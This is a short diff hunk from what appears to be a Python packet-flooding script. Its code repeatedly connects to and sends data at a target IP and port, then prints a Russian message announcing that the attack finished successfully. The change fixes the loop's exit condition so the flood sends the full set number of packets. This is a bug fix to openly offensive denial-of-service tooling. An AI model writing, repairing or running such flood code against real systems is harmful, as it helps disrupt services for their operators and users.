@@ -27,6 +27,6 @@ while True:
 	sock.connect((ip_addr, _port))
 	sock.sendto((byte).encode('utf-8'), (ip_addr, _port))
 	packages -= 1
-	if(packages >= 0):
+	if(packages == 0):
 		break
 print(Fore.YELLOW + 'Атака успешно закончена!')
